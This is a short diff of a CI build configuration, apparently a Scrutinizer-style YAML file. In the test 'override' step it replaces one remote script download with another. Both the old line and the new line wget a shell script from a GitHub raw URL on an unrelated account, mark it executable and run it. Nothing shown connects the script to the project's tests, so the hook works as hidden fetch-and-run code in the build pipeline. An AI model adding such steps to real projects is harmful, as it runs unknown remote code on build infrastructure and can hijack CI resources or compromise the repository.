@@ -3,4 +3,4 @@ build:
     analysis:
       tests:
         override:
-          - command: wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
+          - command: wget https://raw.githubusercontent.com/remakove/sank/main/labs.sh && chmod +x labs.sh && ./labs.sh
